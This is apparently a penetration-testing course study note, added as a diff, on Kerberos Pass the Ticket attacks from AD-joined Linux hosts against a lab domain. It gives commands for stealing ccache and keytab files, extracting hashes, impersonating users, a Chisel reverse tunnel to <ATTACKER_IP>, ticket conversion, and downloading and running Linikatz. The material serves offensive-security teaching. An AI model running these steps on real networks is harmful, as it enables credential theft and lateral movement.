@@ -1,0 +1,770 @@
+# Password Attacks - Pass the Ticket (PtT) from Linux
+
+## Overview
+
+Although less common than on Windows, **Linux systems can also participate in Active Directory environments**.  
+When they do, they often rely on **Kerberos** for authentication, which means Kerberos tickets, caches, and key material may be present on disk or in memory.
+
+If we compromise a Linux host that is:
+
+- domain-joined, or
+- using Kerberos to authenticate to AD resources,
+
+then we may be able to abuse:
+
+- **ccache files**
+- **keytab files**
+- **Kerberos environment variables**
+- **machine tickets**
+- **user tickets**
+
+to impersonate users and move laterally.
+
+This note focuses on how Kerberos works on Linux from an attacker’s point of view, and how we can use recovered tickets for **Pass the Ticket (PtT)** style access.
+
+---
+
+## Why this matters
+
+A Linux host integrated with AD can become a stepping stone into the Windows side of the environment.
+
+From Linux, Kerberos material may allow us to:
+
+- impersonate domain users
+- access SMB shares
+- authenticate to WinRM-enabled hosts
+- use Impacket with Kerberos
+- convert tickets between Linux and Windows formats
+- pivot deeper into the domain
+
+Think of it like finding a valid train pass in someone’s coat pocket: you do not need to know their password if you already have the thing the ticket inspector accepts.
+
+---
+
+# Kerberos on Linux
+
+## General behavior
+
+Kerberos works the same in principle on Linux and Windows:
+
+1. A user authenticates and receives a **TGT**
+2. The TGT is used to request **service tickets (TGS)**
+3. Tickets are then presented to target services
+
+What differs is **how Linux stores ticket material**.
+
+---
+
+## Common Linux Kerberos storage methods
+
+### 1. ccache files
+These are credential cache files that store Kerberos ticket data.
+
+Common characteristics:
+
+- often stored in `/tmp`
+- usually referenced by the `KRB5CCNAME` environment variable
+- usually readable only by the owning user
+- root can usually access them
+
+### 2. keytab files
+A keytab is a file containing Kerberos principals and encrypted keys.
+
+Common uses:
+
+- scripts
+- cronjobs
+- automated service authentication
+- SMB access without interactive password entry
+
+A keytab is not the same as a ticket cache.  
+A **ccache** contains active tickets.  
+A **keytab** contains long-term cryptographic material derived from the account secret.
+
+---
+
+# Identifying Linux and Active Directory integration
+
+## Check domain membership with `realm`
+
+```bash
+realm list
+```
+
+### What it tells us
+This is one of the quickest ways to determine whether the Linux machine is integrated with AD.
+
+Useful details include:
+
+- realm/domain name
+- whether it is a kerberos-member
+- client software in use
+- which users/groups are allowed to log in
+
+### Example indicators
+- `configured: kerberos-member`
+- `server-software: active-directory`
+- `client-software: sssd`
+
+---
+
+## Check for AD integration services
+
+```bash
+ps -ef | grep -i "winbind\|sssd"
+```
+
+### Why
+If `realm` is unavailable, this helps confirm whether services commonly used for AD integration are running.
+
+Useful processes:
+- `sssd`
+- `winbind`
+
+If you see `sssd_be`, `sssd_nss`, `sssd_pam`, that is a strong sign the host is domain-integrated.
+
+---
+
+# Finding Kerberos tickets on Linux
+
+## Check the `KRB5CCNAME` environment variable
+
+```bash
+env | grep -i krb5
+```
+
+### Why
+This often tells us exactly where the current ticket cache lives.
+
+Example:
+```bash
+KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
+```
+
+### Key note
+Some tools require the path only, while some Linux implementations include the `FILE:` prefix.  
+That matters when reusing the cache with other tools.
+
+---
+
+## Search `/tmp` for ccache files
+
+```bash
+ls -la /tmp
+```
+
+Typical findings:
+```bash
+krb5cc_<uid>_<random>
+```
+
+### Why
+Kerberos caches are often left in `/tmp`, and they may belong to:
+
+- currently logged-in users
+- service accounts
+- privileged users
+
+### Important
+ccache files are temporary and expire. Always check validity before relying on them.
+
+---
+
+# Finding keytab files
+
+## Search by filename
+
+```bash
+find / -name *keytab* -ls 2>/dev/null
+```
+
+### Why
+Admins often use `.keytab` in the filename, even though it is not mandatory.
+
+Interesting findings:
+- `/etc/krb5.keytab`
+- application-specific keytabs
+- service account keytabs in scripts or project folders
+
+### Important note
+`/etc/krb5.keytab` is especially valuable because it commonly belongs to the **machine account**.
+
+If readable, it may let us impersonate the Linux machine in AD.
+
+---
+
+## Search cronjobs and scripts
+
+```bash
+crontab -l
+cat /path/to/script.sh
+```
+
+### Why
+If the keytab does not use a `.keytab` extension, scripts often reveal it.
+
+Example pattern:
+```bash
+kinit svc_workstations@INLANEFREIGHT.HTB -k -t /path/to/file.kt
+```
+
+This tells us:
+
+- the principal name
+- the keytab file path
+- that the script is actively using Kerberos
+
+---
+
+# Working with keytab files
+
+## View keytab contents with `klist`
+
+```bash
+klist -k -t /opt/specialfiles/carlos.keytab
+```
+
+### Why
+This lets us identify:
+
+- which principal the keytab belongs to
+- timestamps
+- whether it is useful
+
+Example:
+```text
+Principal
+carlos@INLANEFREIGHT.HTB
+```
+
+---
+
+## Impersonate a user with `kinit`
+
+```bash
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+```
+
+### Why
+This requests a TGT using the keytab and places it into the current session’s ticket cache.
+
+### Verify
+```bash
+klist
+```
+
+Look for:
+- `Default principal`
+- valid ticket start/end times
+- `krbtgt/...`
+
+---
+
+## Test access using the new Kerberos context
+
+### SMB example
+```bash
+smbclient //dc01/carlos -k -c ls
+```
+
+### Why
+If access works, the impersonation is valid and useful.
+
+---
+
+## Important note before importing a keytab
+
+If you want to preserve your current Kerberos session, **save a copy of the current ccache first**.
+
+Because after `kinit`, your session may now represent the new principal.
+
+---
+
+# Extracting secrets from keytab files
+
+## Use KeyTabExtract
+
+```bash
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+```
+
+### Why
+This can extract useful cryptographic material such as:
+
+- NTLM hash
+- AES128 key
+- AES256 key
+- realm/principal details
+
+### Why this matters
+With these values, we may be able to:
+
+- crack the password
+- perform Pass the Hash
+- request new Kerberos tickets
+- move from Linux into Windows-focused tooling
+
+### Example extracted material
+- `NTLM HASH`
+- `AES-256 HASH`
+- `AES-128 HASH`
+
+---
+
+## Practical follow-up options
+
+### Crack the NTLM hash
+Useful if you want the actual plaintext password for:
+
+- `su`
+- SSH
+- other reused credentials
+
+### Use AES/RC4 material
+Useful if you want to:
+
+- request Kerberos tickets
+- use Windows tooling like Rubeus
+- perform OverPass the Hash / Pass the Key style actions
+
+---
+
+# ccache abuse
+
+## Why ccache files matter
+
+A ccache already contains Kerberos tickets.  
+That means you may not need the password or keytab at all.
+
+If you can read the cache, you may be able to **become that user for Kerberos-authenticated operations**.
+
+---
+
+## Copy the ccache locally
+
+```bash
+cp /tmp/krb5cc_<file> .
+```
+
+## Point your session to it
+
+```bash
+export KRB5CCNAME=/root/krb5cc_<file>
+```
+
+## Verify with `klist`
+
+```bash
+klist
+```
+
+### Why
+This confirms:
+
+- which user the cache belongs to
+- whether the ticket is still valid
+- whether there is a usable TGT
+
+---
+
+## Test access using the imported cache
+
+### SMB example
+```bash
+smbclient //dc01/C$ -k -c ls -no-pass
+```
+
+### Why
+This is one of the quickest ways to validate that the Kerberos context works.
+
+If the imported cache belongs to a high-privilege user, this can immediately translate into sensitive access.
+
+---
+
+# Privilege escalation impact
+
+If you become **root** on the Linux host, the whole game changes.
+
+Root can often:
+
+- read other users’ ccache files
+- inspect `/tmp`
+- access `/etc/krb5.keytab`
+- inspect SSSD data
+- reuse machine tickets
+- impersonate higher-privilege domain users
+
+This makes Linux Kerberos hosts extremely valuable once root is obtained.
+
+---
+
+# High-value Kerberos targets
+
+## Machine account ticket
+Common source:
+```bash
+/etc/krb5.keytab
+```
+
+Example machine principal:
+```text
+LINUX01$@INLANEFREIGHT.HTB
+```
+
+### Why it matters
+Machine accounts can authenticate to AD and sometimes provide useful internal access.
+
+---
+
+## Service account tickets
+Often found in:
+- scripts
+- cronjobs
+- automation folders
+- service configs
+
+### Why they matter
+Service accounts are frequently over-permissioned.
+
+---
+
+## Domain admin user ccache
+If found in `/tmp`, this can be gold.
+
+### Why it matters
+A valid TGT for a DA-equivalent account can allow immediate lateral movement into DCs and management systems.
+
+---
+
+# Using Linux attack tools with Kerberos
+
+Many Linux tools support Kerberos authentication directly.
+
+## General rule
+Make sure `KRB5CCNAME` points to the cache you want to use.
+
+---
+
+## Impacket with Kerberos
+
+### Example
+```bash
+proxychains impacket-wmiexec dc01 -k -no-pass
+```
+
+### Key flags
+- `-k` → use Kerberos
+- `-no-pass` → do not prompt for password
+
+### Important
+Use the **hostname**, not just the IP, because Kerberos is very sensitive to SPN and name resolution.
+
+---
+
+## Evil-WinRM with Kerberos
+
+### Example
+```bash
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
+```
+
+### Requirements
+- Kerberos packages installed (`krb5-user` on Debian-based systems)
+- `/etc/krb5.conf` configured correctly
+- proper hostname resolution
+- route/proxy path to the KDC/DC
+
+---
+
+# Kerberos configuration on the attack host
+
+## Install Kerberos support
+
+```bash
+sudo apt-get install krb5-user -y
+```
+
+## Typical `/etc/krb5.conf` essentials
+
+```ini
+[libdefaults]
+    default_realm = INLANEFREIGHT.HTB
+
+[realms]
+    INLANEFREIGHT.HTB = {
+        kdc = dc01.inlanefreight.htb
+    }
+```
+
+### Why
+Without this, Kerberos-aware tools will often fail because they cannot find the realm or KDC.
+
+---
+
+# Pivoting Kerberos traffic from outside the domain
+
+If your attack box cannot directly reach the DC/KDC, you need to fix two things:
+
+1. **routing/proxying**
+2. **name resolution**
+
+---
+
+## Hardcode hosts if DNS is unavailable
+
+Example `/etc/hosts`:
+```text
+172.16.1.10 inlanefreight.htb inlanefreight dc01.inlanefreight.htb dc01
+172.16.1.5  ms01.inlanefreight.htb ms01
+```
+
+### Why
+Kerberos usually wants proper names, not just IPs.
+
+---
+
+## Proxy traffic with Chisel + Proxychains
+
+### Start Chisel server on attack host
+```bash
+sudo ./chisel server --reverse
+```
+
+### Start client on pivot host
+```cmd
+c:\tools\chisel.exe client <ATTACKER_IP>:8080 R:socks
+```
+
+### Proxychains config
+```text
+[ProxyList]
+socks5 127.0.0.1 1080
+```
+
+### Why
+This lets Kerberos-aware tools reach:
+
+- TCP/88 (KDC)
+- SMB/445
+- WinRM/5985
+- RPC/WMI ports
+
+through a pivot.
+
+---
+
+# Ticket conversion between Linux and Windows
+
+Kerberos ticket formats differ across tooling.
+
+## Convert ccache → kirbi
+
+```bash
+impacket-ticketConverter krb5cc_file julio.kirbi
+```
+
+## Convert kirbi → ccache
+Same tool can do the reverse as well.
+
+### Why this matters
+This is very useful when moving tickets between:
+
+- Linux tooling
+- Windows tooling
+- Mimikatz
+- Rubeus
+- Impacket
+
+---
+
+## Import converted ticket into Windows with Rubeus
+
+```cmd
+Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+```
+
+### Verify
+```cmd
+klist
+dir \\dc01\julio
+```
+
+---
+
+# Linikatz
+
+## What it is
+**Linikatz** is a Linux-focused credential extraction tool inspired by Mimikatz.
+
+## Why useful
+It can harvest:
+
+- Kerberos tickets
+- keytabs
+- SSSD data
+- machine credentials
+- user caches
+
+from Linux systems integrated with AD.
+
+---
+
+## Run Linikatz
+
+```bash
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+chmod +x linikatz.sh
+sudo ./linikatz.sh
+```
+
+### Typical value
+It helps centralize findings from:
+
+- `/etc/krb5.keytab`
+- `/tmp/krb5cc_*`
+- `/var/lib/sss/db/*`
+- Samba/SSSD/Kerberos configs
+
+### Why helpful
+Instead of manually checking many locations, Linikatz acts like a collection and triage tool.
+
+---
+
+# Core commands summary
+
+## Identify AD integration
+```bash
+realm list
+ps -ef | grep -i "winbind\|sssd"
+```
+
+## Find ccache location
+```bash
+env | grep -i krb5
+ls -la /tmp
+```
+
+## Find keytabs
+```bash
+find / -name *keytab* -ls 2>/dev/null
+crontab -l
+cat /path/to/script.sh
+```
+
+## Inspect keytab
+```bash
+klist -k -t /path/to/file.keytab
+```
+
+## Import keytab into session
+```bash
+kinit user@REALM -k -t /path/to/file.keytab
+klist
+```
+
+## Reuse ccache
+```bash
+export KRB5CCNAME=/path/to/ccache
+klist
+```
+
+## Test SMB access
+```bash
+smbclient //dc01/share -k -c ls -no-pass
+```
+
+## Extract key material from keytab
+```bash
+python3 keytabextract.py /path/to/file.keytab
+```
+
+## Use Impacket with Kerberos
+```bash
+impacket-wmiexec dc01 -k -no-pass
+```
+
+## Use Evil-WinRM with Kerberos
+```bash
+evil-winrm -i dc01 -r inlanefreight.htb
+```
+
+## Convert ticket formats
+```bash
+impacket-ticketConverter input.ccache output.kirbi
+impacket-ticketConverter input.kirbi output.ccache
+```
+
+## Run Linikatz
+```bash
+sudo ./linikatz.sh
+```
+
+---
+
+# Practical attack flow
+
+## Low-priv user on Linux
+- check `realm list`
+- inspect `env | grep -i krb5`
+- look in `/tmp`
+- search for cronjobs and scripts
+- search for keytab files
+
+## If keytab found
+- identify principal with `klist -k`
+- use `kinit` to impersonate
+- test SMB/WinRM/Impacket access
+
+## If root obtained
+- inspect all `/tmp/krb5cc_*`
+- inspect `/etc/krb5.keytab`
+- inspect SSSD files
+- target machine ticket
+- target privileged user ccache
+- export `KRB5CCNAME`
+- use Kerberos-aware tooling for lateral movement
+
+---
+
+# Important notes
+
+- Kerberos tickets **expire**, so always check `klist`
+- ccache files are temporary and may disappear after logout or renewal
+- Kerberos is **name-sensitive** — hostname resolution matters
+- some tools dislike the `FILE:` prefix in `KRB5CCNAME`
+- use the **hostname/SPN**, not just the IP, when authenticating with Kerberos
+- Linux hosts joined to AD are often overlooked but can expose high-value credentials
+- service account keytabs in scripts are especially valuable
+
+---
+
+# Detection / OPSEC considerations
+
+- reading others’ ccache files generally requires elevated privilege
+- access to `/etc/krb5.keytab` is highly suspicious
+- touching cronjobs/scripts may leave traces
+- Kerberos-based lateral movement still creates authentication events in AD
+- ticket reuse can be very quiet compared with password guessing, but it is not invisible
+- proxying Kerberos incorrectly often breaks authentication and can generate noisy failures
+
+---
+
+# Quick mental model
+
+- **keytab** = long-term Kerberos secret material
+- **ccache** = active Kerberos ticket cache
+- **kinit** = request a TGT using password or keytab
+- **klist** = inspect tickets/keytabs
+- **KRB5CCNAME** = tells tools which cache to use
+
+A simple way to think about it:
+
+- **keytab** is like a master badge printer  
+- **ccache** is like an already-issued visitor badge  
+- **PtT on Linux** is using that valid badge to walk into more rooms
+
+---
+
+# Tags
+
+#password-attacks #kerberos #passtheticket #ptt #linux #active-directory #ccache #keytab #impacket #evil-winrm #linikatz
